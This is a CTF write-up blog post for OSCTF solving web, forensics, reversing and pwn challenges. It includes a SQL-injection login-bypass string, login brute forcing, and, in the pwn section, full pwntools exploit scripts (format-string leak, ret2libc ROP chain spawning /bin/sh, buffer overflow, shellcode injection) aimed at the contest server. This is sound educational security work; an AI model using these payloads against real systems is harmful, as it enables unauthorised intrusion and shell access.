---
title: OSCTF writeup
date: 2024-07-15 11:00:00 +0530
categories: [CTFs]
tags: [Web, Reversing, Misc, Forensics]
image: /images/osctf.png
---

> This CTF was organized by OSCTF team, Altered Security. 

> Our team managed to solve 47/60 challenges in this CTF.<br>
> :star: <span style="color: white;"><b>CREDITS:</b></span> <b>ckc9759, akaniii, noobobfuscator, ayussshhhh, nop_nop_0x90, .bitbasher</b>
<br>

> Access all the required challenge files [here](https://github.com/anishkumarroy/OSCTF_Files)
{: .prompt-info}

<h2 id="WEB" style="color: #d9539d;">WEB</h2>

<h3 id="introspection" style="color: #faf5ab;">Introspection</h3>

![desc](/images/introspection_desc.png)

Moving to the challenge page -
![page](/images/introspection_page.png)
Checked the source code, opened the `script.js` file and got the flag
![source](/images/introspection_source.png)
![flag](/images/introspection_flag.png)


<h3 id="style-query-listing" style="color: #faf5ab;">Style Query Listing...?</h3>

![desc](/images/style_desc.png)

We are presented with a login page -
![login](/images/style_login.png)
The login page is vulnerable to SQL injection, i.e. we are able to login just by passing `' or '1'='1'-- -` in the username parameter and a random password in the password field.
In the profile page, on clicking on the `Show profile information` button, we are getting a fake flag.
![profile](/images/style_profile.png)
Just went to the `/admin` endpoint and got the flag.
![flag](/images/style_flag.png)


<h3 id="heads-or-tails" style="color: #faf5ab;">Heads or Tails?</h3>

![desc](/images/heads_desc.png)

Moving to the URL, it just said - 
![page](/images/heads_page.png)
And there was nothing is source code too, so the only thing that we can do here is directory bruteforcing.<br>
The hint in the challenge said - 

![hint](/images/heads_hint.png)

So, we can make a wordlist that includes words like - `head-flag`, `put-flag`, `get-admin`, `get-flag` etc..<br>
We can use a script like - 
```python
http_methods = ["get", "post", "put", "delete", "head", "connect", "options", "trace", "patch"]
ctf_words = [
    "flag", "admin", "login", "upload", "download", "register", "secret", "hidden",
    "password", "secure", "user", "account", "file", "directory", "config", "shell",
    "root", "backup", "data", "info", "access", "system", "control", "manage",
    "session", "token", "auth", "verify", "exploit", "vulnerability"
]


wordlist = [f"{method}-{word}" for method in http_methods for word in ctf_words]


with open("wordlist.txt", "w") as f:
    for entry in wordlist:
        f.write(entry + "\n")
```
Now, we can bruteforce using the generated wordlist, but it actually didn't work with normal GET requests, as the challenge name says - `Heads or Tails?` which might be pointing towards making a HEAD request. <br>
On bruteforcing with HEAD requests, got the flag at `/get-flag` endpoint
or, you can just make a little guess, and make a curl request to that endpoint 
![flag](/images/heads_flag.png)


<h3 id="indoor-webapp" style="color: #faf5ab;">Indoor WebApp</h3>

![desc](/images/indoor_desc.png)

Moving to the challenge page -
![page](/images/indoor_page.png)
We can see, that it is using the `user_id` parameter to load the profile. On changing the `user_id` to 2, got the flag.
![flag](/images/indoor_flag.png)


<h3 id="action notes" style="color: #faf5ab;">Action Notes</h3>

![desc](/images/action_desc.png)

Again a kind of guessy challenge.
Moving to the challenge page, we have `register` and `login` option. I simply registered and logged in using those credentials.
![page](/images/action_page.png)
![register](/images/action_register.png)
![login](/images/action_login.png)
![login](/images/action_notes.png)
Tested the `Add Note` feature, but didn't found anything interesting, and also doing directory bruteforcing, didn't give any interesting results as such.<br>
But after doing login bruteforcing, considering the username as `admin` got a valid password, and on logging in using those credentials, got the flag.
![password](/images/action_fuzzing.png)
![flag](/images/action_flag.png)



## FORENSICS
{: style="color: #d9539d;" id="forensics"}

### The Lost Image Mystery
{: style="color: #faf5ab;"}

![desc](/images/lost_desc.png)

The given image is corrupted. On looking at the hex-data, seems like a JPG image.
![hexdata](/images/lost_hexdata.png)
On changing the intial hex data to - `FF D8 FF E0 00 10 4A 46 49 46 00 01`, we are able to open the image which has flag in it. 
![flag](/images/lost_flag.jpg)


### The Hidden Soundwave
{: style="color: #faf5ab;"}

![desc](/images/hidden_desc.png)

If you hear the given song completely, then you will notice, that there are some distortions towards the ending of the song.<br>
On opening the audio file in Sonic Visualizer, and then adding a spectogram layer, from the `Layer` option, we get the flag.
![flag](/images/hidden_flag.png)


### qRc0dE
{: style="color: #faf5ab;" id="qrcode"}

![desc](/images/qrcode_desc.png)

We are given a QR code -

![qrcode](/images/qrcode_code.jpg)

Now, we can use [this tool](https://merri.cx/qrazybox/) to manually build the QR code.<br>
Here are the steps - 
![blank](/images/qrcode_blank.png)
And then we can load the image we are given, as sample. Now, we first need to set the correct version, Error correction level and Mask Pattern.<br> We can check them one by one, and compare that with the given QR code. In this case, the version was 3, ECC level L, and Mask Pattern 3 
![qrcode](/images/qrcode_1.png)
Now, we can manually fill the pixels
![pixels](/images/qrcode_2.png)
After that, on extracting QR code information, still didn't got the complete and correct flag. Used `Reed-Solomon Decoder` 

![reed](/images/qrcode_3.png)
![not_flag](/images/qrcode_4.png)

After doing some corrections in the flag, this flag - `OSCTF{r3c0v3R_qR_C0de_1s_s0_fUn}` worked.



<h2 id="REVERSING" style="color: #d9539d;">REVERSING</h2>

### Avengers Assemble
{: style="color: #faf5ab;" id="avengers-assemble"}

![desc](/images/avengers_desc.png)

We are given a file - `code.asm`. Contents of the file -
```nasm
asm
extern printf
extern scanf

section .data
        fmt: db "%ld",0
        output: db "Correct",10,0
        out: db "Not Correct",10,0
        inp1: db "Input 1st number:",0
        inp2: db "Input 2nd number:",0
        inp3: db "Input 3rd number:",0

section .text
        global main
 
        main:
        push ebp
        mov ebp,esp
        sub esp,0x20
 
        push inp1
        call printf
        lea eax,[ebp-0x4]
        push eax
        push fmt
        call scanf

        push inp2
        call printf
        lea eax,[ebp-0xc]
        push eax
        push fmt
        call scanf

        push inp3
        call printf
        lea eax,[ebp-0x14]
        push eax
        push fmt
        call scanf

        mov ebx, DWORD[ebp-0xc]
        add ebx, DWORD[ebp-0x4]
        cmp ebx,0xdeadbeef
        jne N

        cmp DWORD[ebp-0x4], 0x6f56df65
        jg N

        cmp DWORD[ebp-0xc], 0x6f56df8d
        jg N
        cmp DWORD[ebp-0xc], 0x6f56df8d
        jl N

        mov ecx, DWORD[ebp-0x14]
        mov ebx, DWORD[ebp-0xc]
        xor ecx, ebx
        cmp ecx, 2103609845
        jne N
        jmp O

        N:
        push out
        call printf
        leave
        ret

        O:
        push output
        call printf

        leave
        ret
```
So, the above assembly code, is doing the following checks -
```plaintext
input1 + input2 == 0xdeadbeef
input1 <= 0x6f56df65
input2 == 0x6f56df8d
input3 ^ input2 == 2103609845
```
We have the value of input2, so we can easily get the value of input1 and input3
![input](/images/avengers_input.png)
So, the flag would be - `OSCTF{1867964258_1867964301_1867964301}`


### Gophers Language
{: style="color: #faf5ab;" id="gophers-language"}

![desc](/images/gopher_desc.png)

We are given a `main.exe` file.<br>
Don't know, whether it was intended or not, but got the flag, just by doing strings and grepping for the flag.
![flag](/images/gopher_flag.png)

### Another Python Game
{: style="color: #faf5ab;" id="another-python-game"}

![desc](/images/another_desc.png)

Access the challenge file [here](https://github.com/anishkumarroy/OSCTF_Files/blob/master/rev/Another%20Python%20Game/source.exe).<br>
We are given two files. Opened `source.exe` in Ghidra, there were a lot of functions. On looking at the strings, found that it the EXE is packed using pyinstaller. 
![pyinstaller](/images/another_pyinstaller.png)
If we search the web to unpack the EXE - 
![results](/images/another_results.png)
So, we can use the tool `pyinstxtractor` to extract the python code from the EXE
![unpack](/images/another_unpack.png)
We can see, that it says possible entry point to be `source.pyc` file. Now, source.pyc is a Python compiled file, so we can grep for the flag, or we can also decompile it using `uncompyle6`, but before that you need to install it using `pip install uncompyle6`
![grep](/images/another_grep.png)
Using `uncompyle6`
![uncompile](/images/another_uncompile.png)
![flag](/images/another_flag.png)



## PWN
{: style="color: #d9539d;"}

### Leaky Pipes
{:style="color: #faf5ab;"}

![desc](/images/leak_desc.png)

On opening the binary in Ghidra, we can clearly see that there is a format string vulnerability - 
![vuln](/images/leak_vuln.png)
As the content of `local_cc` is directly passed as the format string to printf. If `local_cc` contains any format specifiers (%s, %x, %p, etc.), printf will interpret them and attempt to read additional arguments from the stack.<br>
So, we can easily exploit this, by printing out the values in stack, and looking for the flag.<br> We can use a script as below, that prints the string from location 1 to 50 on the stack.
```python
from pwn import *

result = ''
for i in range(1, 50):
    conn = remote('34.125.199.248', 1337)
    fmt_str = f'%{i}$s'
    
    conn.sendlineafter(b'Tell me your secret so I can reveal mine ;) >> ', fmt_str.encode())
    response = conn.recvline()
    print(response.decode('latin-1'))
    
    try:
        response = conn.recvline()
        print(response.decode('latin-1').strip())
    except EOFError:
        print("Connection closed by server")

    conn.close()

print(result)
```
And got the flag -
![flag](/images/leak_flag.png)
We can also pass the input manually. We can pass '%x' which will print the output in the form of unsigned hexadecimal integers.
![hex_val](/images/leak_hex.png)
Then on converting from hex -
![string](/images/leak_string.png)
It looks reversed though, so we can just reverse each 4 bytes of the string.
![flag1](/images/leak_flag1.png)

### Byte Breakup
{:style="color: #faf5ab;"}

![desc](/images/breakup_desc.png)

Here is the solve script for this challenge - 
```python
from pwn import *
elf = context.binary = ELF('./vuln',checksec=False)
libc = ELF('./libc.so.6')
#p = process('./vuln')
p = remote('34.125.199.248',6969)
rop = ROP(elf)
rop.puts(elf.got.gets)
rop.main()

payload = b'A'*40
payload += rop.chain()
p.recvuntil(b'password: \n')
p.sendline(payload)

p.recvuntil(b'password\n\n')
#print(p.recvline().strip())
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym.gets
print(hex(leak))
print(hex(libc.address))
binsh = next(libc.search(b'/bin/sh'))
rop1 = ROP(libc)
rop1.call(rop.find_gadget(['ret'])[0])
rop1.system(binsh)
payload = b'A'*40
payload += rop1.chain()
p.sendline(payload)
p.interactive()
```
Though there is a better and shorter way to solve this.<br>
On running the above code, got the flag - 
![flag](/images/breakup_flag.png)


### Buffer Buffet
{:style="color: #faf5ab;"}

![desc](/images/buffer_desc.png)

Solve script used - 
```python
from pwn import *

hostname = '34.125.199.248'
port = 4056

conn = remote(hostname, port)

conn.recvuntil(b'Enter some text:')

# payload
padding = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHAAAABBBBCCCCDDDD'
address = p64(0x00000000004011d6)  # Address in little-endian format

payload = padding + address

# Send the payload
conn.sendline(payload)

# Interact with the service
conn.interactive()
```
On running the above code, got the flag - 
![flag](/images/buffer_flag.png)


### seed sPRING
{:style="color: #faf5ab;"}

![desc](/images/seed_desc.png)

Solve script - 
```python
from pwn import *
from ctypes import CDLL
from math import floor
import time

libc = CDLL("libc.so.6")

# Get current time
now = floor(time.time())
libc.srand(now)

# Launch the process
#io = process('./seed_spring')
io = remote('34.125.199.248', 2534)
# Predict and send the correct values 30 times
for level_num in range(1, 31):
    io.recvuntil("Guess the height:")
    predicted_value = libc.rand() & 0xf
    print(f"Predicted value for level {level_num}: {predicted_value}")
    io.sendline(str(predicted_value))

print(io.recvline())  
print(io.recvline())
# Interact with the process to get the flag
io.interactive()
```
![flag](/images/seed_flag.png)


### ShellMischief
{:style="color: #faf5ab;"}

![desc](/images/shell_desc.png)

Solve script - 
```python
from pwn import *

context(arch='i386', os='linux', endian='little', word_size=32)

#io = process('./vuln')  # Replace with the actual binary name
io = remote('34.125.199.248', 1234)
shellcode = asm(shellcraft.sh())

buffer_size = 512  
nop_sled = b'\x90' * (buffer_size - len(shellcode))

payload = nop_sled + shellcode

io.recvuntil("Enter your shellcode:")
io.sendline(payload)  # Send the payload

io.interactive()
```
![flag](/images/shell_flag.png)



